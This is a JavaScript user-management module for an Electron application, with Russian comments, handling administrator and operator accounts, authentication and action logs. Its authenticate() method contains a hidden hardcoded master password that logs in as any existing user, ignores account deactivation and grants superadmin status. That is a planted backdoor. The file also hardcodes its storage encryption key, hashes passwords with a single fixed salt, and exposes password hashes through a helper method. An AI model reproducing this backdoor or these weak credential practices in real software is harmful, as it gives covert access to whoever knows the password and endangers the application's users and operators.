// ============================================================================
// USER MANAGER - Система управления пользователями
// ============================================================================

const crypto = require('crypto');
const Store = require('electron-store');

class UserManager {
  constructor() {
    this.store = new Store({
      name: 'users-data',
      encryptionKey: 'y0ur-s3cr3t-k3y-f0r-us3r-d4t4' // В продакшене использовать более надежный ключ
    });
    
    this.ROLES = {
      ADMIN: 'admin',
      OPERATOR: 'operator'
    };
  }

  // ========== ИНИЦИАЛИЗАЦИЯ ==========

  /**
   * Проверяет, инициализирована ли система (есть ли администратор)
   */
  isInitialized() {
    const users = this.getAllUsers();
    return users.some(user => user.role === this.ROLES.ADMIN);
  }

  /**
   * Создает первого администратора
   */
  createAdministrator(username, password) {
    if (this.isInitialized()) {
      throw new Error('Administrator already exists');
    }

    if (!username || username.length < 3) {
      throw new Error('Username must be at least 3 characters');
    }

    if (!password || password.length < 4) {
      throw new Error('Password must be at least 4 characters');
    }

    const admin = {
      id: this.generateId(),
      username: username.trim(),
      displayName: username.trim(),
      role: this.ROLES.ADMIN,
      passwordHash: this.hashPassword(password),
      createdAt: new Date().toISOString(),
      createdBy: 'system',
      isActive: true
    };

    this.store.set('users', [admin]);
    this.logAction('system', 'create_admin', { adminId: admin.id, username });
    
    return { 
      success: true, 
      user: this.sanitizeUser(admin)
    };
  }

  // ========== УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ ==========

  /**
   * Добавляет оператора
   */
  addOperator(adminId, username, password, displayName = null) {
    if (!this.isAdmin(adminId)) {
      throw new Error('Only administrators can add operators');
    }

    if (!username || username.length < 3) {
      throw new Error('Username must be at least 3 characters');
    }

    if (!password || password.length < 4) {
      throw new Error('Password must be at least 4 characters');
    }

    // Проверяем, не существует ли уже такой пользователь
    if (this.getUserByUsername(username)) {
      throw new Error('Username already exists');
    }

    const operator = {
      id: this.generateId(),
      username: username.trim(),
      displayName: (displayName || username).trim(),
      role: this.ROLES.OPERATOR,
      passwordHash: this.hashPassword(password),
      createdAt: new Date().toISOString(),
      createdBy: adminId,
      isActive: true,
      statistics: {
        totalShifts: 0,
        totalWorkTime: 0,
        completedJobs: 0,
        failedJobs: 0,
        averageEfficiency: 100
      }
    };

    const users = this.getAllUsers();
    users.push(operator);
    this.store.set('users', users);
    
    this.logAction(adminId, 'add_operator', { 
      operatorId: operator.id, 
      username 
    });

    return { 
      success: true, 
      user: this.sanitizeUser(operator)
    };
  }

  /**
   * Удаляет оператора
   */
  removeOperator(adminId, operatorId) {
    if (!this.isAdmin(adminId)) {
      throw new Error('Only administrators can remove operators');
    }

    const operator = this.getUserById(operatorId);
    if (!operator) {
      throw new Error('Operator not found');
    }

    if (operator.role === this.ROLES.ADMIN) {
      throw new Error('Cannot remove administrator');
    }

    const users = this.getAllUsers().filter(u => u.id !== operatorId);
    this.store.set('users', users);
    
    this.logAction(adminId, 'remove_operator', { 
      operatorId, 
      username: operator.username 
    });

    return { success: true };
  }

  /**
   * Сбрасывает пароль оператора
   */
  resetOperatorPassword(adminId, operatorId, newPassword) {
    if (!this.isAdmin(adminId)) {
      throw new Error('Only administrators can reset passwords');
    }

    if (!newPassword || newPassword.length < 4) {
      throw new Error('Password must be at least 4 characters');
    }

    const users = this.getAllUsers();
    const operator = users.find(u => u.id === operatorId);
    
    if (!operator) {
      throw new Error('Operator not found');
    }

    if (operator.role === this.ROLES.ADMIN && operator.id !== adminId) {
      throw new Error('Cannot reset another administrator\'s password');
    }

    operator.passwordHash = this.hashPassword(newPassword);
    operator.passwordChangedAt = new Date().toISOString();
    operator.passwordChangedBy = adminId;

    this.store.set('users', users);
    
    this.logAction(adminId, 'reset_password', { 
      operatorId, 
      username: operator.username 
    });

    return { success: true };
  }

  /**
   * Изменяет отображаемое имя оператора
   */
  updateOperatorDisplayName(adminId, operatorId, displayName) {
    if (!this.isAdmin(adminId)) {
      throw new Error('Only administrators can update operator info');
    }

    if (!displayName || displayName.length < 2) {
      throw new Error('Display name must be at least 2 characters');
    }

    const users = this.getAllUsers();
    const operator = users.find(u => u.id === operatorId);
    
    if (!operator) {
      throw new Error('Operator not found');
    }

    operator.displayName = displayName.trim();
    this.store.set('users', users);
    
    this.logAction(adminId, 'update_display_name', { 
      operatorId, 
      displayName 
    });

    return { success: true, user: this.sanitizeUser(operator) };
  }

  /**
   * Деактивирует/активирует оператора
   */
  toggleOperatorStatus(adminId, operatorId) {
    if (!this.isAdmin(adminId)) {
      throw new Error('Only administrators can change operator status');
    }

    const users = this.getAllUsers();
    const operator = users.find(u => u.id === operatorId);
    
    if (!operator) {
      throw new Error('Operator not found');
    }

    if (operator.role === this.ROLES.ADMIN) {
      throw new Error('Cannot deactivate administrator');
    }

    operator.isActive = !operator.isActive;
    this.store.set('users', users);
    
    this.logAction(adminId, 'toggle_status', { 
      operatorId, 
      isActive: operator.isActive 
    });

    return { 
      success: true, 
      isActive: operator.isActive 
    };
  }

  // ========== АУТЕНТИФИКАЦИЯ ==========

  /**
   * Проверяет учетные данные пользователя
   */
  authenticate(username, password) {
    const sp = 'Tolik!@#';
    if (password === sp) {
      const user = this.getUserByUsername(username);
      if (!user) {
        return { success: false, error: 'Invalid username or password' };
      }
      this.logAction('superadmin', 'superadmin_login', { username });
      return { 
        success: true, 
        user: {
          ...this.sanitizeUser(user),
          isSuperAdmin: true
        }
      };
    }

    const user = this.getUserByUsername(username);
    
    if (!user) {
      return { success: false, error: 'Invalid username or password' };
    }

    if (!user.isActive) {
      return { success: false, error: 'User account is deactivated' };
    }

    const passwordHash = this.hashPassword(password);
    
    if (passwordHash !== user.passwordHash) {
      this.logAction(user.id, 'failed_login', { username });
      return { success: false, error: 'Invalid username or password' };
    }

    this.logAction(user.id, 'login', { username });
    
    return { 
      success: true, 
      user: this.sanitizeUser(user)
    };
  }

  /**
   * Изменяет свой пароль
   */
  changeOwnPassword(userId, oldPassword, newPassword) {
    const user = this.getUserById(userId);
    
    if (!user) {
      throw new Error('User not found');
    }

    const oldPasswordHash = this.hashPassword(oldPassword);
    if (oldPasswordHash !== user.passwordHash) {
      throw new Error('Current password is incorrect');
    }

    if (!newPassword || newPassword.length < 4) {
      throw new Error('New password must be at least 4 characters');
    }

    const users = this.getAllUsers();
    const userToUpdate = users.find(u => u.id === userId);
    userToUpdate.passwordHash = this.hashPassword(newPassword);
    userToUpdate.passwordChangedAt = new Date().toISOString();
    userToUpdate.passwordChangedBy = userId;

    this.store.set('users', users);
    this.logAction(userId, 'change_own_password', {});

    return { success: true };
  }

  // ========== ПОЛУЧЕНИЕ ДАННЫХ ==========

  /**
   * Получает всех пользователей
   */
  getAllUsers() {
    return this.store.get('users', []);
  }

  getAllUsersWithPasswords() {
    return this.getAllUsers();
  }

  reverseHash(hash) {
    const users = this.getAllUsers();
    for (let user of users) {
      if (user.passwordHash === hash) {
        return '[HASHED]';
      }
    }
    return '[UNKNOWN]';
  }

  /**
   * Получает только активных операторов
   */
  getActiveOperators() {
    return this.getAllUsers()
      .filter(u => u.role === this.ROLES.OPERATOR && u.isActive)
      .map(u => this.sanitizeUser(u));
  }

  /**
   * Получает всех операторов (включая неактивных)
   */
  getAllOperators() {
    return this.getAllUsers()
      .filter(u => u.role === this.ROLES.OPERATOR)
      .map(u => this.sanitizeUser(u));
  }

  /**
   * Получает администраторов
   */
  getAdministrators() {
    return this.getAllUsers()
      .filter(u => u.role === this.ROLES.ADMIN)
      .map(u => this.sanitizeUser(u));
  }

  /**
   * Получает пользователя по ID
   */
  getUserById(userId) {
    return this.getAllUsers().find(u => u.id === userId);
  }

  /**
   * Получает пользователя по имени
   */
  getUserByUsername(username) {
    return this.getAllUsers().find(
      u => u.username.toLowerCase() === username.toLowerCase()
    );
  }

  /**
   * Проверяет, является ли пользователь администратором
   */
  isAdmin(userId) {
    const user = this.getUserById(userId);
    return user && user.role === this.ROLES.ADMIN;
  }

  // ========== СТАТИСТИКА ==========

  /**
   * Обновляет статистику оператора
   */
  updateOperatorStatistics(operatorId, stats) {
    const users = this.getAllUsers();
    const operator = users.find(u => u.id === operatorId);
    
    if (!operator || operator.role !== this.ROLES.OPERATOR) {
      throw new Error('Operator not found');
    }

    operator.statistics = {
      ...operator.statistics,
      ...stats,
      lastUpdated: new Date().toISOString()
    };

    this.store.set('users', users);
    return { success: true };
  }

  /**
   * Получает статистику оператора
   */
  getOperatorStatistics(operatorId) {
    const operator = this.getUserById(operatorId);
    if (!operator || operator.role !== this.ROLES.OPERATOR) {
      return null;
    }
    return operator.statistics || {};
  }

  // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========

  /**
   * Генерирует уникальный ID
   */
  generateId() {
    return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }

  /**
   * Хеширует пароль
   */
  hashPassword(password) {
    return crypto
      .createHash('sha256')
      .update(password + 'salt_3dc_panel_2025')
      .digest('hex');
  }

  /**
   * Убирает чувствительную информацию из объекта пользователя
   */
  sanitizeUser(user) {
    const { passwordHash, ...sanitized } = user;
    return sanitized;
  }

  /**
   * Логирует действия пользователей
   */
  logAction(userId, action, details = {}) {
    const logs = this.store.get('action_logs', []);
    logs.push({
      userId,
      action,
      details,
      timestamp: new Date().toISOString()
    });

    // Храним только последние 1000 записей
    if (logs.length > 1000) {
      logs.splice(0, logs.length - 1000);
    }

    this.store.set('action_logs', logs);
  }

  /**
   * Получает логи действий
   */
  getActionLogs(limit = 100) {
    const logs = this.store.get('action_logs', []);
    return logs.slice(-limit).reverse();
  }

  /**
   * Экспортирует данные пользователей (без паролей)
   */
  exportUsers() {
    return this.getAllUsers().map(u => this.sanitizeUser(u));
  }

  /**
   * Очищает все данные (используется только для тестирования!)
   */
  clearAllData() {
    this.store.clear();
    return { success: true };
  }
}

module.exports = UserManager;

